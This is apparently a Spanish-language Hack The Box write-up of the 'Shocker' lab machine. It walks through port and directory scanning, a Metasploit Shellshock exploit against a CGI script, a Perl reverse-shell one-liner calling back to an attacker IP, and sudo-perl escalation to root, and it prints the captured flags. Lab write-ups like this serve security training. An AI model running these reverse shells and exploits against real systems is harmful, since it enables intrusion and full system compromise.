---
title: Shocker
date: 2026-1-5 18:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, shocker ]     
image:
    path: https://www.hackthebox.com/images/logo-htb.svg
    alt: Hack The Box
---

> Shocker
Linux · Easy - Adventure mode


## 🔭 Reconocimiento: 

```shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -Pn -sSVC --min-rate  5000 10.129.63.153
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-05 11:49 CET
Nmap scan report for 10.129.63.153
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.03 seconds
```
El escaneo de Nmap nos muestra dos puertos 

## 🔭 Reconocimiento: 

``` shell
┌──(pmartinezr㉿kali)-[~/htb/shocker]
└─$ dirsearch -u http://shocker.htb/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
from pkg_resources import DistributionNotFound, VersionConflict
_|. _ _  _  _  _ _|_    v0.4.3
(_||| _) (/_(_|| (_| )
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
Output File: /home/pmartinezr/htb/shellshock/reports/http_10.129.63.153/__26-01-05_19-01-53.txt
Target: http://shocker.htb/
[19:01:53] Starting:
[19:01:57] 403 -  299B  - /.ht_wsr.txt
[19:01:57] 403 -  302B  - /.htaccess.orig
[19:01:57] 403 -  302B  - /.htaccess.bak1
[19:01:57] 403 -  304B  - /.htaccess.sample
[19:01:57] 403 -  302B  - /.htaccess.save
[19:01:57] 403 -  303B  - /.htaccess_extra
[19:01:57] 403 -  302B  - /.htaccess_orig
[19:01:57] 403 -  300B  - /.htaccess_sc
[19:01:57] 403 -  300B  - /.htaccessBAK
[19:01:57] 403 -  300B  - /.htaccessOLD
[19:01:57] 403 -  301B  - /.htaccessOLD2
[19:01:57] 403 -  292B  - /.htm
[19:01:57] 403 -  293B  - /.html
[19:01:57] 403 -  302B  - /.htpasswd_test
[19:01:57] 403 -  299B  - /.httr-oauth
[19:01:57] 403 -  298B  - /.htpasswds
[19:02:16] 403 -  296B  - /cgi-bin/
[19:02:49] 403 -  302B  - /server-status/
[19:02:49] 403 -  301B  - /server-status
Task Completed
```
Dir search nos muestra un directorio clave ```/cgi-bin/```

## 🔭 Reconocimiento: 

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ feroxbuster -u http://shocker.htb//cgi-bin/ -x sh,pl,py,php
___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
🎯  Target Url            │ http://shocker.htb//cgi-bin
🚩  In-Scope Url          │ shocker.htb
🚀  Threads               │ 50
📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
👌  Status Codes          │ All Status Codes!
💥  Timeout (secs)        │ 7
🦡  User-Agent            │ feroxbuster/2.13.1
💉  Config File           │ /etc/feroxbuster/ferox-config.toml
🔎  Extract Links         │ true
💲  Extensions            │ [sh, pl, py, php]
🏁  HTTP methods          │ [GET]
🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        7l       17w      118c http://shocker.htb//cgi-bin/user.sh
404      GET        9l       33w      298c http://shocker.htb//cgi-bin/Reports%20List.sh
404      GET        9l       33w      298c http://shocker.htb//cgi-bin/Reports%20List.pl
404      GET        9l       33w      298c http://shocker.htb//cgi-bin/Reports%20List.py
404      GET        9l       33w      299c http://shocker.htb//cgi-bin/Reports%20List.php
404      GET        9l       33w      300c http://shocker.htb//cgi-bin/external%20files.sh
404      GET        9l       33w      300c http://shocker.htb//cgi-bin/external%20files.pl
404      GET        9l       33w      300c http://shocker.htb//cgi-bin/external%20files.py
[##>-----------------] - 15s    16482/150000  2m      found:8       errors:0
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_shocker_htb__cgi-bin-1767643259.state ...
[##>-----------------] - 15s    16493/150000  2m      found:8       errors:0
[##>-----------------] - 15s    16315/150000  1077/s  http://shocker.htb//cgi-bin/
```
Esta herramienta simplifica la tarea de hacer fuzzing para buscar scripts dentro de directorios, como se adivina por el nombre 
de la máquina si presuponemos que tiene una vulnerabilidad relacionada con Shellsock, rápidamente encuentra ```http://shocker.htb//cgi-bin/user.sh```

## CVE-2014-6271

### 💣 Preparación: 

``` shell
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi http://shocker.htb//cgi-bin/user.sh
targeturi => http://shocker.htb//cgi-bin/user.sh
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhost 10.129.63.153
rhost => 10.129.63.153
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
[*] Started reverse TCP handler on 10.10.14.110:4444
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 10.129.63.153
[*] Meterpreter session 1 opened (10.10.14.110:4444 -> 10.129.63.153:55454) at 2026-01-05 21:02:54 +0100
meterpreter >
```
Una vez tenemos un script en que apoyarnos para realizar la explotación, hacerlo con Metasploit es sencillo 

## 👽 Acciones: 

```shell
meterpreter > shell
Process 11933 created.
Channel 1 created.
whoami
shelly
cd /home/shelly
cat user.txt
b2680dede4170e20a6d2726e6a58266b
sudo -l
Matching Defaults entries for shelly on Shocker:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User shelly may run the following commands on Shocker:
(root) NOPASSWD: /usr/bin/perl
```

``` shell
export RHOST=10.10.14.110
export RPORT=4448
perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
Busco en gtobins algún exploit [https://gtfobins.github.io/gtfobins/perl/#reverse-shell](https://gtfobins.github.io/gtfobins/perl/#reverse-shell)
en este caso solo encuentro la manera de obtener una revershell pero esta mejora bastante la shell anterior.

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ socat TCP-LISTEN:4448 -
/bin/sh: 0: can't access tty; job control turned off
$ sudo perl -e 'exec "/bin/bash"'
whoami
root
cat /root/root.txt
c2d4c1bce4522a08c6e591b13a295cc3
```
Esta vez consigo la escalada de privilegios usando Socat y elevando privilegios con ```sudo perl -e 'exec "/bin/bash"'```

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/108)